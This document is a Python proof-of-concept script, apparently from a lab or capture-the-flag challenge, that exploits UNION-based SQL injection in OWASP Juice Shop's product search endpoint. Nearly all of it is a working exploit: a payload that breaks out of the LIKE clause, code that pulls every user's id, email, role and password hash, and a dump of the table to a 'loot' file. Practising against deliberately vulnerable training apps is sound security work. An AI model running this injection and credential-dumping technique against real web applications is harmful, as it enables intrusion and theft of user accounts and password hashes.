#!/usr/bin/env python3
"""
c05-sqli-union-dump PoC
Target: OWASP Juice Shop  ->  /rest/products/search?q=
Vuln:   UNION-based SQL injection (SQLite). The q parameter is embedded in:
          SELECT ... FROM Products WHERE (name LIKE '%<q>%' OR description LIKE '%<q>%') ...
        We break out with  ')) --  and UNION a 10-column SELECT reading the Users table.
        Response maps: name=email, description=role, and we also pull id & password hash.

Saves:
  /workspace/loot/c5_users_full.txt   - entire Users table (id,email,role,password)
  /workspace/evidence/c5_users.txt    - FIRST 10 rows  (email,role)  [required deliverable]
"""
import json
import urllib.parse
import urllib.request
import sys

BASE = "http://host.docker.internal:3000"
ENDPOINT = BASE + "/rest/products/search"

# 10 output columns: id,name,description,price,deluxePrice,image,alternateImages,createdAt,updatedAt,deletedAt
# Map Users -> products:  name<-email, description<-role, price<-password
PAYLOAD = "qwert')) UNION SELECT id,email,role,password,5,6,7,8,9,10 FROM Users--"


def run(payload):
    url = ENDPOINT + "?" + urllib.parse.urlencode({"q": payload})
    with urllib.request.urlopen(url, timeout=15) as r:
        raw = r.read().decode("utf-8", "replace")
    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        raise RuntimeError("Non-JSON response (injection error?):\n" + raw[:400])


def main():
    resp = run(PAYLOAD)
    if resp.get("status") != "success":
        print("Unexpected response:", resp, file=sys.stderr)
        sys.exit(1)

    rows = []
    for d in resp["data"]:
        rows.append({
            "id": d.get("id"),
            "email": d.get("name"),
            "role": d.get("description"),
            "password_hash": d.get("price"),
        })

    # Order by id to define "first 10 rows" deterministically.
    rows.sort(key=lambda x: (x["id"] if isinstance(x["id"], int) else 0))

    # Full dump
    full_lines = ["id,email,role,password_hash"]
    for r in rows:
        full_lines.append(f"{r['id']},{r['email']},{r['role']},{r['password_hash']}")
    with open("/workspace/loot/c5_users_full.txt", "w") as f:
        f.write("\n".join(full_lines) + "\n")

    # Required deliverable: first 10 rows (email + role)
    first10 = rows[:10]
    ev_lines = ["email,role"]
    for r in first10:
        ev_lines.append(f"{r['email']},{r['role']}")
    with open("/workspace/evidence/c5_users.txt", "w") as f:
        f.write("\n".join(ev_lines) + "\n")

    print(f"[+] Total Users rows exfiltrated: {len(rows)}")
    print(f"[+] Full dump        -> /workspace/loot/c5_users_full.txt")
    print(f"[+] First 10 (email,role) -> /workspace/evidence/c5_users.txt\n")
    print("\n".join(ev_lines))


if __name__ == "__main__":
    main()
